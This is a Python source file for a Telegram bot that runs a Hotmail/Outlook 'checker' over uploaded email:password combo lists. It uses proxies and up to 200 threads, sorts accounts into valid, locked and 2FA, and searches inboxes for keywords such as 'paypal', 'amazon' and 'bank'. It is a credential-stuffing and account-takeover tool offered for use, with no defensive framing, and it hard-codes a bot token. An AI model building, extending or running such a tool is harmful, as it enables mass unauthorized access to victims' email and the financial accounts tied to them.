import os
import asyncio
import logging
import zipfile
import shutil
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from checker_core import HotmailCheckerV77

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Constants
BOT_TOKEN = "8278566702:AAGW3849-ms-ghFYZLJU9CUd8AKV__yKbyE"
TEMP_DIR = "temp_user_data"

os.makedirs(TEMP_DIR, exist_ok=True)

# Helper to get user specific directory
def get_user_dir(user_id):
    path = os.path.join(TEMP_DIR, str(user_id))
    os.makedirs(path, exist_ok=True)
    return path

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_html(
        f"Hi {user.mention_html()}! \n\n"
        "I am your Hotmail/Outlook Checker Bot.\n"
        "<b>Features:</b>\n"
        "• Upload <code>combo.txt</code> (email:pass)\n"
        "• Upload <code>proxy.txt</code> (optional)\n"
        "• /check to start\n"
        "• /settings to configure threads/keywords\n"
        "• /stop to stop checking"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>Instructions:</b>\n"
        "1. Send me a file. I will ask if it is a Combo list or Proxy list.\n"
        "2. Use /settings to change threads (default 50) or keywords.\n"
        "3. Use /check to start the process.\n"
        "4. You will get live progress updates.\n"
        "5. When finished, I will send a ZIP with the results.",
        parse_mode="HTML"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document
    if file.mime_type and "text" in file.mime_type or file.file_name.endswith(".txt"):
        file_id = file.file_id

        # Store file_id in user_data to avoid callback data limits (64 bytes)
        context.user_data['last_uploaded_file_id'] = file_id

        # Ask user what this file is
        keyboard = [
            [
                InlineKeyboardButton("Combo List", callback_data="set_combo"),
                InlineKeyboardButton("Proxy List", callback_data="set_proxy"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(f"Received <code>{file.file_name}</code>. What is this?", reply_markup=reply_markup, parse_mode="HTML")
    else:
        await update.message.reply_text("Please upload a .txt file.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    user_id = query.from_user.id
    user_dir = get_user_dir(user_id)

    file_id = context.user_data.get('last_uploaded_file_id')
    if not file_id:
        await query.edit_message_text("⚠️ Session expired or file lost. Please upload again.")
        return

    if data == "set_combo":
        new_file = await context.bot.get_file(file_id)
        file_path = os.path.join(user_dir, "combo.txt")
        await new_file.download_to_drive(file_path)
        context.user_data['combo_path'] = file_path

        # Count lines
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            count = sum(1 for _ in f)

        await query.edit_message_text(f"✅ Combo list set! ({count} lines).\nRun /check to start.")

    elif data == "set_proxy":
        new_file = await context.bot.get_file(file_id)
        file_path = os.path.join(user_dir, "proxy.txt")
        await new_file.download_to_drive(file_path)
        context.user_data['proxy_path'] = file_path

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            count = sum(1 for _ in f)

        await query.edit_message_text(f"✅ Proxy list set! ({count} proxies).")

async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    current_threads = context.user_data.get('threads', 50)
    current_keywords = context.user_data.get('keywords', ['paypal', 'amazon', 'bank'])

    msg = (
        f"<b>Current Settings:</b>\n"
        f"Threads: {current_threads}\n"
        f"Keywords: {', '.join(current_keywords)}\n\n"
        "To change threads, send: <code>/setthreads 100</code>\n"
        "To add keyword, send: <code>/addkeyword crypto</code>\n"
        "To clear keywords, send: <code>/clearkeywords</code>"
    )
    await update.message.reply_text(msg, parse_mode="HTML")

async def set_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        val = int(context.args[0])
        if 1 <= val <= 200:
            context.user_data['threads'] = val
            await update.message.reply_text(f"Threads set to {val}.")
        else:
            await update.message.reply_text("Please choose between 1 and 200.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setthreads <number>")

async def add_keyword(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        kw = context.args[0]
        keywords = context.user_data.get('keywords', ['paypal', 'amazon', 'bank'])
        if kw not in keywords:
            keywords.append(kw)
        context.user_data['keywords'] = keywords
        await update.message.reply_text(f"Added keyword: {kw}")
    else:
        await update.message.reply_text("Usage: /addkeyword <word>")

async def clear_keywords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['keywords'] = []
    await update.message.reply_text("Keywords cleared.")

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'checker' in context.user_data:
        checker = context.user_data['checker']
        checker.stop()
        await update.message.reply_text("Stopping check... Please wait for current tasks to finish.")
    else:
        await update.message.reply_text("No check running.")

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if 'is_running' in context.user_data and context.user_data['is_running']:
        await update.message.reply_text("A check is already running! Use /stop to stop it.")
        return

    combo_path = context.user_data.get('combo_path')
    if not combo_path or not os.path.exists(combo_path):
        await update.message.reply_text("⚠️ Please upload a Combo list first!")
        return

    proxy_path = context.user_data.get('proxy_path')

    # Read files
    with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = f.readlines()

    proxies = []
    if proxy_path and os.path.exists(proxy_path):
        with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
            proxies = [l.strip() for l in f if l.strip()]

    # Config
    threads = context.user_data.get('threads', 50)
    keywords = context.user_data.get('keywords', ['paypal', 'amazon', 'bank'])

    config = {
        'threads': threads,
        'search_keywords': keywords,
        'proxy_type': 'http'
    }

    # Initialize Checker
    checker = HotmailCheckerV77(combos, proxies, config)
    context.user_data['checker'] = checker
    context.user_data['is_running'] = True

    status_msg = await update.message.reply_text("🚀 Starting check...")

    async def progress_callback(stats):
        # Throttle updates to avoid hitting rate limits (e.g. every 5s)
        last_update = context.user_data.get('last_update_time', 0)
        current_time = time.time()
        if current_time - last_update > 3: # Update every 3 seconds max
            context.user_data['last_update_time'] = current_time
            text = (
                f"Checking... {stats['checked']}/{stats['total']}\n"
                f"✅ Valid: {stats['valid']}\n"
                f"❌ Invalid: {stats['invalid']}\n"
                f"🔒 Locked: {stats['locked']}\n"
                f"🔐 2FA: {stats['custom']}"
            )
            try:
                await status_msg.edit_text(text)
            except Exception:
                pass # Ignore "message not modified" errors

    # Run checker
    try:
        await checker.run(progress_callback)
    except Exception as e:
        logger.error(f"Error in checker: {e}")
        await update.message.reply_text(f"An error occurred: {e}")
    finally:
        context.user_data['is_running'] = False
        # Send final update
        stats = checker.stats
        final_text = (
            f"🏁 Check Complete!\n"
            f"Total: {stats['total']}\n"
            f"✅ Valid: {stats['valid']}\n"
            f"❌ Invalid: {stats['invalid']}\n"
            f"🔒 Locked: {stats['locked']}\n"
            f"🔐 2FA: {stats['custom']}"
        )
        try:
            await status_msg.edit_text(final_text)
        except:
            pass

        # Generate results
        user_dir = get_user_dir(user_id)
        results_dir = os.path.join(user_dir, "results")
        files = checker.generate_results_files(results_dir)

        if files:
            # Zip it
            zip_path = os.path.join(user_dir, f"results_{int(time.time())}.zip")
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for file in files:
                    zipf.write(file, os.path.basename(file))

            await update.message.reply_document(document=open(zip_path, 'rb'), caption="Here are your results! 📂")

            # Cleanup
            try:
                shutil.rmtree(results_dir)
                os.remove(zip_path)
            except:
                pass

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("settings", settings_command))
    application.add_handler(CommandHandler("setthreads", set_threads))
    application.add_handler(CommandHandler("addkeyword", add_keyword))
    application.add_handler(CommandHandler("clearkeywords", clear_keywords))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("stop", stop_check))

    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_handler))

    application.run_polling()

if __name__ == "__main__":
    main()
